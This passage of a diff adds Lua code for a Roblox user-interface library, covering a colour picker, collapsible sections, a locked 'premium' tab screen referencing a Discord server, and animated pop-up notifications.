+				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+					if ColorInput then
+						ColorInput:Disconnect()
+					end
+				end
+			end)
+
+			AddConnection(Hue.InputBegan, function(input)
+				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+					if HueInput then
+						HueInput:Disconnect()
+					end;
+
+					HueInput = AddConnection(RunService.RenderStepped, function()
+						local HueY = (math.clamp(Mouse.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)
+
+						HueSelection.Position = UDim2.new(0.5, 0, HueY, 0)
+						ColorH = 1 - HueY
+
+						UpdateColorPicker()
+					end)
+				end
+			end)
+
+			AddConnection(Hue.InputEnded, function(input)
+				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+					if HueInput then
+						HueInput:Disconnect()
+					end
+				end
+			end)
+
+			function Colorpicker:Set(Value)
+				Colorpicker.Value = Value
+				ColorpickerBox.BackgroundColor3 = Colorpicker.Value
+				ColorpickerConfig.Callback(Colorpicker.Value)
+			end
+
+			Colorpicker:Set(Colorpicker.Value)
+			if ColorpickerConfig.Flag then				
+				Library.Flags[ColorpickerConfig.Flag] = Colorpicker
+			end
+			return Colorpicker
+		end  
+		return ElementFunction   
+	end	
+
+	local ElementFunction = {}
+
+	function ElementFunction:AddSection(SectionConfig)
+		SectionConfig.Name = SectionConfig.Name or "Section"
+
+		local SectionFrame = SetChildren(SetProps(MakeElement("TFrame"), {
+			Size = UDim2.new(1, 0, 0, 26),
+			Parent = Container
+		}), {
+			AddThemeObject(SetProps(MakeElement("Label", SectionConfig.Name, 14), {
+				Size = UDim2.new(1, -12, 0, 16),
+				Position = UDim2.new(0, 0, 0, 3),
+				Font = Enum.Font.FredokaOne
+			}), "TextDark"),
+			SetChildren(SetProps(MakeElement("TFrame"), {
+				AnchorPoint = Vector2.new(0, 0),
+				Size = UDim2.new(1, 0, 1, -24),
+				Position = UDim2.new(0, 0, 0, 23),
+				Name = "Holder"
+			}), {
+				MakeElement("List", 0, 6)
+			}),
+		})
+
+		AddConnection(SectionFrame.Holder.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+			SectionFrame.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y + 31)
+			SectionFrame.Holder.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y)
+		end)
+
+		local SectionFunction = {}
+		for i, v in next, GetElements(SectionFrame.Holder) do
+			SectionFunction[i] = v 
+		end
+		return SectionFunction
+	end	
+
+	for i, v in next, GetElements(Container) do
+		ElementFunction[i] = v 
+	end
+
+	if TabConfig.PremiumOnly then
+		for i, v in next, ElementFunction do
+			ElementFunction[i] = function() end
+		end    
+		Container:FindFirstChild("UIListLayout"):Destroy()
+		Container:FindFirstChild("UIPadding"):Destroy()
+		SetChildren(SetProps(MakeElement("TFrame"), {
+			Size = UDim2.new(1, 0, 1, 0),
+			Parent = ItemParent
+		}), {
+			AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://3610239960"), {
+				Size = UDim2.new(0, 18, 0, 18),
+				Position = UDim2.new(0, 15, 0, 15),
+				ImageTransparency = 0.4
+			}), "Text"),
+			AddThemeObject(SetProps(MakeElement("Label", "Unauthorised Access", 14), {
+				Size = UDim2.new(1, -38, 0, 14),
+				Position = UDim2.new(0, 38, 0, 18),
+				TextTransparency = 0.4
+			}), "Text"),
+			AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://4483345875"), {
+				Size = UDim2.new(0, 56, 0, 56),
+				Position = UDim2.new(0, 84, 0, 110),
+			}), "Text"),
+			AddThemeObject(SetProps(MakeElement("Label", "Premium Features", 14), {
+				Size = UDim2.new(1, -150, 0, 14),
+				Position = UDim2.new(0, 150, 0, 112),
+				Font = Enum.Font.FredokaOne
+			}), "Text"),
+			AddThemeObject(SetProps(MakeElement("Label", "This part of the script is locked to Sirius Premium users. Purchase Premium in the Discord server (discord.gg/sirius)", 12), {
+				Size = UDim2.new(1, -200, 0, 14),
+				Position = UDim2.new(0, 150, 0, 138),
+				TextWrapped = true,
+				TextTransparency = 0.4
+			}), "Text")
+		})
+	end
+	return ElementFunction   
+end  
+
+return TabFunction
+end
+
+local Configs_HUB = {
+Cor_Hub = Color3.fromRGB(15, 15, 15),
+Cor_Options = Color3.fromRGB(15, 15, 15),
+Cor_Stroke = Color3.fromRGB(60, 60, 60),
+Cor_Text = Color3.fromRGB(240, 240, 240),
+Cor_DarkText = Color3.fromRGB(140, 140, 140),
+Corner_Radius = UDim.new(0, 4),
+Text_Font = Library.Font
+}
+
+local TweenService = game:GetService("TweenService")
+
+local function Create(instance, parent, props)
+local new = Instance.new(instance, parent)
+if props then
+table.foreach(props, function(prop, value)
+new[prop] = value
+end)
+end
+return new
+end
+
+local function SetProps(instance, props)
+if instance and props then
+table.foreach(props, function(prop, value)
+instance[prop] = value
+end)
+end
+return instance
+end
+
+local function Corner(parent, props)
+local new = Create("UICorner", parent)
+new.CornerRadius = Configs_HUB.Corner_Radius
+if props then
+SetProps(new, props)
+end
+return new
+end
+
+local function Stroke(parent, props)
+local new = Create("UIStroke", parent)
+new.Color = Configs_HUB.Cor_Stroke
+new.ApplyStrokeMode = "Border"
+if props then
+SetProps(new, props)
+end
+return new
+end
+
+local function CreateTween(instance, prop, value, time, tweenWait)
+local tween = TweenService:Create(instance,
+TweenInfo.new(time, Enum.EasingStyle.Linear),
+{[prop] = value})
+tween:Play()
+if tweenWait then
+tween.Completed:Wait()
+end
+end
+
+local ScreenGui = Create("ScreenGui", Container)
+
+local Menu_Notifi = Create("Frame", ScreenGui, {
+Size = UDim2.new(0, 300, 1, 0),
+Position = UDim2.new(1, 0, 0, 0),
+AnchorPoint = Vector2.new(1, 0),
+BackgroundTransparency = 1
+})
+
+local Padding = Create("UIPadding", Menu_Notifi, {
+PaddingLeft = UDim.new(0, 25),
+PaddingTop = UDim.new(0, 25),
+PaddingBottom = UDim.new(0, 50)
+})
+
+local ListLayout = Create("UIListLayout", Menu_Notifi, {
+Padding = UDim.new(0, 15),
+VerticalAlignment = "Bottom"
+})
+
+function Library:MakeNotifi(Configs)
+local Title = Configs.Title or "Title!"
+local text = Configs.Text or "Notification content... what will it say??"
+local timewait = Configs.Time or 5
+
+local Frame1 = Create("Frame", Menu_Notifi, {
+Size = UDim2.new(2, 0, 0, 0),
+BackgroundTransparency = 1,
+AutomaticSize = "Y",
+Name = "Title"
+})
+
+local Frame2 = Create("Frame", Frame1, {
+Size = UDim2.new(0, Menu_Notifi.Size.X.Offset - 50, 0, 0),
+BackgroundColor3 = Configs_HUB.Cor_Hub,
+Position = UDim2.new(0, Menu_Notifi.Size.X.Offset, 0, 0),
+AutomaticSize = "Y"
+})Corner(Frame2)
+
+local TextLabel = Create("TextLabel", Frame2, {
+Size = UDim2.new(1, 0, 0, 25),
+Font = Configs_HUB.Text_Font,
+BackgroundTransparency = 1,
+Text = Title,
+TextSize = 20,
+Position = UDim2.new(0, 20, 0, 5),
+TextXAlignment = "Left",
+TextColor3 = Configs_HUB.Cor_Text
+})
+
+local TextButton = Create("TextButton", Frame2, {
+Text = "X",
+Font = Configs_HUB.Text_Font,
+TextSize = 20,
+BackgroundTransparency = 1,
+TextColor3 = Color3.fromRGB(200, 200, 200),
+Position = UDim2.new(1, -5, 0, 5),
+AnchorPoint = Vector2.new(1, 0),
+Size = UDim2.new(0, 25, 0, 25)
+})
+
+local TextLabel = Create("TextLabel", Frame2, {
+Size = UDim2.new(1, -30, 0, 0),
+Position = UDim2.new(0, 20, 0, TextButton.Size.Y.Offset + 10),
+TextSize = 15,
+TextColor3 = Configs_HUB.Cor_DarkText,
+TextXAlignment = "Left",
+TextYAlignment = "Top",
+AutomaticSize = "Y",
+Text = text,
+Font = Configs_HUB.Text_Font,
+BackgroundTransparency = 1,
+AutomaticSize = Enum.AutomaticSize.Y,
+TextWrapped = true
+})
+
+local FrameSize = Create("Frame", Frame2, {
+Size = UDim2.new(1, 0, 0, 2),
+BackgroundColor3 = Configs_HUB.Cor_Stroke,
+Position = UDim2.new(0, 2, 0, 30),
+BorderSizePixel = 0
+})Corner(FrameSize)Create("Frame", Frame2, {
+Size = UDim2.new(0, 0, 0, 5),
+Position = UDim2.new(0, 0, 1, 5),
+BackgroundTransparency = 1
+})
+
+task.spawn(function()
+CreateTween(FrameSize, "Size", UDim2.new(0, 0, 0, 2), timewait, true)
+end)
+
+TextButton.MouseButton1Click:Connect(function()
+CreateTween(Frame2, "Position", UDim2.new(0, -20, 0, 0), 0.1, true)
+CreateTween(Frame2, "Position", UDim2.new(0, Menu_Notifi.Size.X.Offset, 0, 0), 0.5, true)
+Frame1:Destroy()
+end)
+
+task.spawn(function()
+CreateTween(Frame2, "Position", UDim2.new(0, -20, 0, 0), 0.5, true)
+CreateTween(Frame2, "Position", UDim2.new(), 0.1, true)task.wait(timewait)
+if Frame2 then
+CreateTween(Frame2, "Position", UDim2.new(0, -20, 0, 0), 0.1, true)
+CreateTween(Frame2, "Position", UDim2.new(0, Menu_Notifi.Size.X.Offset, 0, 0), 0.5, true)
+Frame1:Destroy()
+end
+end)
+end
+
+function Library:Destroy()
+Container:Destroy()
+end
+
+return Library
